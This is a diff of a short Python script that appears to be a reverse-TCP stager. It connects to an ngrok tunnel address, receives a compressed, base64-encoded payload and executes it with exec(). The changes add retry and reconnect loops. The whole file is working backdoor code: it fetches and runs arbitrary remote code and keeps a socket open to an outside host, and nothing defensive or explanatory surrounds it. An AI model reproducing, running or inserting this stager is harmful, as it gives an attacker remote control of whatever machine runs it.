@@ -1,13 +1,25 @@
 import socket,zlib,base64,struct,time
+s=socket.socket(2,socket.SOCK_STREAM)
+
+host = "2.tcp.eu.ngrok.io:11843";
 for x in range(10):
     try:
-        s=socket.socket(2,socket.SOCK_STREAM)
-        s.connect(('2.tcp.eu.ngrok.io',11843))
+        
+        s.connect((host.split(":")[0],int(host.split(":")[1])))
         break
-    except:
+    except Exception as e:
+        print(e)
         time.sleep(5)
-l=struct.unpack('>I',s.recv(4))[0]
-d=s.recv(l)
-while len(d)<l:
-    d+=s.recv(l-len(d))
-exec(zlib.decompress(base64.b64decode(d)),{'s':s})
+try:
+    l=struct.unpack('>I',s.recv(4))[0]
+    d=s.recv(l)
+    while len(d)<l:
+        d+=s.recv(l-len(d))
+    exec(zlib.decompress(base64.b64decode(d)),{'s':s})
+except:
+    while True:
+        try:
+            s.connect((host.split(":")[0],int(host.split(":")[1])))
+            break
+        except:
+            time.sleep(5)
